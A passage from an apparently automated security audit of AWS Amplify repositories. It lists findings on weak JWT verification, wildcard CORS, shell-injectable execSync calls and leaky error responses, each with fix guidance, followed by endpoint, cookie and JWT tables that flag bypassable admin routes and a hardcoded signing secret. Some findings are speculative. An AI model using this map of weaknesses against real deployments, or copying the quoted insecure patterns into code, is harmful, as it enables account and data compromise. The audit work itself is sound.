const { payload: decodedJwtAccess } = await jose.jwtVerify(tokens.accessToken.jwtToken, N_JWKS);
// Missing: { issuer, audience } options
```

**Why it's real:** While the ID token is verified with issuer and audience checks (line 133), the access token verification at line 141 only checks signature and expiry. An access token from a different Cognito user pool (same region) signed by the same KMS key could pass verification. This is weaker than the ID token verification and the inconsistency suggests an oversight.

**Fix guidance:**
- Add issuer and audience checks to access token verification
- Verify `token_use` claim equals `access`

---

### [FINDING 45]
**Title:** GraphiQL Explorer Dev Server Disables Firewall and Allows All Hosts
**Severity:** Medium
**Reachable via GET?:** Yes (local development server)
**Endpoint(s):** GraphiQL Explorer webpack dev server
**Inputs:** N/A (configuration issue)

**Source:** `amplify-cli/packages/amplify-graphiql-explorer/config/webpackDevServer.config.js:35-39`
```javascript
allowedHosts: disableFirewall ? 'all' : [allowedHost],
headers: {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': '*',
  'Access-Control-Allow-Headers': '*',
},
```

**Why it's real:** The dev server allows all hosts and has permissive CORS. Combined with the hardcoded JWT secret (Finding 21), a malicious website visited by a developer can make cross-origin requests to the GraphiQL explorer and execute arbitrary GraphQL queries against the local AppSync simulator.

**Fix guidance:**
- Restrict `allowedHosts` to `localhost` and `127.0.0.1`
- Use specific CORS origin instead of `*`

---

### [FINDING 46]
**Title:** Liveness Lambda Functions Use Wildcard CORS with Sensitive Data
**Severity:** Low
**Reachable via GET?:** Yes (Lambda function URL or API Gateway)
**Endpoint(s):** Liveness verification Lambda functions
**Inputs:** N/A (configuration issue)

**Source:** `amplify-ui/environments/liveness/liveness-environment/amplify/backend/function/livenessenvironment6105cfac/src/index.js:31-33`
```javascript
headers: {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': '*',
},
```

**Why it's real:** Liveness verification functions use wildcard CORS, allowing any origin to call the API. If the function returns session tokens or biometric verification data, this could be exploited cross-origin.

**Fix guidance:**
- Set specific allowed origins
- Use Amplify's built-in CORS configuration

---

### [FINDING 47]
**Title:** Unvalidated CSS Color Values in Discord Bot SVG Icon Generation
**Severity:** Low
**Reachable via GET?:** Yes (GET /api/p/color/[color].svg)
**Endpoint(s):** Color SVG API endpoint
**Inputs:** URL path parameter `color`

**Source:** `discord-bot/apps/discord-bot-frontend/src/lib/discord/commands/admin.ts:36-37`
```typescript
const color = guildMember?.roles?.highest?.color ?? '91A6A6'
const roleIcon = `<img src="${import.meta.env.VITE_HOST}/api/p/color/${color}.svg" ...`
```

**Why it's real:** While the `color` value here comes from Discord's API (guild member role color), the SVG endpoint at `/api/p/color/[color].svg` likely accepts the color parameter from the URL. If this SVG endpoint returns the color value embedded in SVG XML without sanitization, it could be an SVG injection vector.

**Fix guidance:**
- Validate color parameter matches hex color pattern
- Sanitize SVG output

---

### [FINDING 48]
**Title:** Package Script Injection via manipulated package.json in Post-Init Setup
**Severity:** Medium
**Reachable via GET?:** No (CLI execution after clone)
**Endpoint(s):** `amplify init --app <url>` post-init step
**Inputs:** package.json from cloned repository

**Source:** `amplify-cli/packages/amplify-cli/src/init-steps/postInitSetup.ts:48-51`
```typescript
if (packageManager !== null) {
  const packageScript = getPackageScript();
  execSync(`${packageManager.executable} ${packageScript}`, { stdio: 'inherit' });
}
```

**Dataflow summary:**
- After cloning the repo (Finding 28), `getPackageScript()` reads from the cloned package.json
- The script name is interpolated into `execSync` with the package manager executable
- A malicious repository could have a crafted package.json with script names containing shell metacharacters

**Why it's real:** This extends Finding 28 — after the repo is cloned, any scripts defined in the malicious package.json are executed. This is a supply-chain attack vector where a malicious `--app` URL leads to arbitrary code execution through both the git clone injection and the subsequent npm/yarn script execution.

**Fix guidance:**
- Validate and sanitize the package script name
- Use `execFileSync` with argument arrays instead of string interpolation
- Prompt user before running any scripts from cloned repositories

---

### [FINDING 49]
**Title:** Sensitive Error Details Leak DynamoDB Table ARNs and IAM Roles
**Severity:** Low
**Reachable via GET?:** Yes (GET endpoints in CRUD Lambda)
**Endpoint(s):** All CRUD Lambda GET endpoints
**Inputs:** Malformed query parameters

**Source:** `amplify-cli/packages/amplify-nodejs-function-template-provider/resources/lambda/crud/app.js.ejs:100-103`
```javascript
} catch (err) {
  res.statusCode = 500;
  res.json({ error: err, url: req.url, body: req.body });
}
```

**Why it's real:** DynamoDB errors include table ARNs (containing AWS account ID, region, and table name), IAM role names, and access denied details. Leaking these enables targeted attacks on the AWS account.

**Fix guidance:**
- Return generic error messages to clients
- Log full errors to CloudWatch only

---

### [FINDING 50]
**Title:** GraphQL FilterExpression Built from User Input Without VTL-Level Validation
**Severity:** Medium
**Reachable via GET?:** Yes (via GraphQL queries)
**Endpoint(s):** AppSync GraphQL query endpoints for @model types with filters
**Inputs:** GraphQL filter argument

**Source:** `amplify-category-api/packages/amplify-graphql-model-transformer/src/resolvers/dynamodb/query.ts`
```typescript
methodCall(ref('util.parseJson'),
  methodCall(ref('util.transform.toDynamoDBFilterExpression'), ref('filter'))
)
```

**Sink:** DynamoDB FilterExpression in query operation

**Dataflow summary:**
- GraphQL query filter argument (user-controlled)
- Passed to AppSync's `util.transform.toDynamoDBFilterExpression()` utility
- Relies entirely on AppSync's internal transformation logic for safety
- No VTL-level validation of filter structure or operators

**Why it's real:** While AppSync's utility function provides a layer of protection, the transformation depends on correct handling of all filter operators and nested structures. Any edge case or bug in the AppSync utility could allow filter injection. Multiple resolvers across @model, @index, and @relational transformers use this same pattern.

**Fix guidance:**
- Add VTL-level validation of filter field names against model schema
- Limit filter depth and complexity
- Validate filter operators against expected values

---

## INVENTORIES

### A) Endpoint & Parameter Inventory (Key Entries)

| METHOD | PATH | Handler | Query Params | Cookies | Auth | Sinks |
|--------|------|---------|-------------|---------|------|-------|
| POST | /graphql | amplify-appsync-simulator operations.ts:27 | - | - | JWT (unverified), API Key, IAM | GraphQL execution |
| GET | /api-config | amplify-appsync-simulator operations.ts:29 | - | - | NONE | Config exposure |
| DELETE | /clear-data | amplify-appsync-simulator operations.ts:31 | - | - | NONE | Database delete |
| POST | /amplifyadmin/ | admin-login-server.ts:85 | - | - | Token validation (flawed) | Credential storage |
| GET | /getUser | admin-auth-app.js:148 | username | - | checkGroup (bypassed) | Cognito AdminGetUser |
| GET | /listUsers | admin-auth-app.js:163 | limit, token | - | checkGroup (bypassed) | Cognito ListUsers |
| GET | /listGroups | admin-auth-app.js:173 | limit, token | - | checkGroup (bypassed) | Cognito ListGroups |
| GET | /listGroupsForUser | admin-auth-app.js:183 | username, limit, token | - | checkGroup (bypassed) | Cognito AdminListGroupsForUser |
| GET | /listUsersInGroup | admin-auth-app.js:199 | groupname, limit, token | - | checkGroup (bypassed) | Cognito ListUsersInGroup |
| POST | /addUserToGroup | admin-auth-app.js:73 | - | - | checkGroup (bypassed) | Cognito AdminAddUserToGroup |
| POST | /api/switch-guild | discord-bot switch-guild/+server.ts:5 | - | - | Session required | HTTP redirect (open redirect) |
| GET | /api/auth/sign-in-callback | adapter-nextjs handleSignInCallbackRequest.ts | code, state, error | PKCE, STATE cookies | State+PKCE validation | Cognito token exchange |
| GET | /api/auth/sign-out-callback | adapter-nextjs handleSignOutCallbackRequest.ts | - | IS_SIGNING_OUT, refreshToken | Signing-out cookie | Token revocation |
| GET | /* | amplify-storage-simulator S3server.ts:127 | prefix, maxKeys, delimiter | - | NONE | Filesystem read (path traversal) |
| PUT | /* | amplify-storage-simulator S3server.ts:242 | partNumber, uploadId | - | NONE | Filesystem write (path traversal) |
| GET | /api/github/[username] | discord-bot [username]/+server.ts:4 | - | - | None visible | GitHub API proxy (path injection) |
| PUT | /[resource]/object/* | CRUD Lambda app.js.ejs:161 | - | - | IAM/Cognito | DynamoDB PutCommand (body injection) |
| POST | /[resource] | CRUD Lambda app.js.ejs:184 | - | - | IAM/Cognito | DynamoDB PutCommand (body injection) |
| POST | /api/webhooks/github-release | discord-bot github-release/+server.ts:24 | - | - | Webhook signature | Discord webhook relay |

### B) Cookie Inventory

| Cookie Name | Where Read | Where Used |
|------------|-----------|-----------|
| PKCE_COOKIE_NAME | getCookieValuesFromRequest.ts | Sign-in callback state validation |
| STATE_COOKIE_NAME | getCookieValuesFromRequest.ts | OAuth state CSRF protection |
| IS_SIGNING_OUT | getCookieValuesFromRequest.ts | Sign-out flow proof |
| IS_SIGNING_OUT_REDIRECTING | getCookieValuesFromRequest.ts | Sign-out redirect tracking |
| CognitoIdentityServiceProvider.*.accessToken | tokenCookies.ts | Server-side auth |
| CognitoIdentityServiceProvider.*.idToken | tokenCookies.ts | Server-side auth |
| CognitoIdentityServiceProvider.*.refreshToken | tokenCookies.ts | Server-side token refresh |
| CognitoIdentityServiceProvider.*.LastAuthUser | tokenCookies.ts | Server-side user lookup |
| GUILD_COOKIE | handle-saved-guild.ts | Discord bot guild selection |

### C) JWT Verification Audit

| Location | Method | Verifies Signature? | Checks Issuer? | Checks Audience? | Checks Expiry? | Issues |
|----------|--------|-------------------|----------------|-----------------|----------------|--------|
| amplify-appsync-simulator helpers.ts:38 | jwt-decode | NO | NO | NO | NO | CRITICAL: All claims trusted without verification |
| admin-login-server.ts:133 (idToken) | jose.jwtVerify | YES | YES* | YES* | YES | *Issuer/audience from untrusted source |
| admin-login-server.ts:141 (accessToken) | jose.jwtVerify | YES | NO | NO | YES | Missing issuer/audience checks |
| isValidCognitoToken.ts:22 | aws-jwt-verify | YES | YES | YES | NO* | *Expired tokens accepted as valid |
| completeOAuthFlow.ts:142 | decodeJWT (base64) | NO | NO | NO | NO | Client-side only; no verification |
| amplify-graphiql-explorer jwt.ts:9 | jose SignJWT | YES (HS256) | NO | NO | NO | Hardcoded secret 'open-secrete' |

### D) POST→GET Conversion Candidates

| Endpoint | Evidence | Viable? |
|----------|---------|---------|
| POST /graphql (simulator) | Express does not restrict to POST only | Yes - no method check on handler |
| POST /addUserToGroup | Body params required; Express does not share body/query | No |
| POST /amplifyadmin/ | Body required for token payload | No |
| POST /api/switch-guild | formData required | Unlikely |

---

## METRICS

- **Repositories analyzed:** 11
- **Source files scanned:** ~15,000+ (TypeScript, JavaScript, VTL)
- **HTTP endpoints cataloged:** 25+
- **Unique cookie names tracked:** 9+
- **JWT handling locations audited:** 6
- **Parallel analysis workers:** 12 (JWT, SSRF, XSS, SQLi, RCE, Cookie/DOM, Endpoint Mapping, CLI deep-dive, Category-API VTL audit, UI auth audit, Backend/Codegen audit, Auth deep-dive)
- **Total findings:** 50
- **Critical:** 2
- **High:** 13
- **Medium:** 28
- **Low:** 7
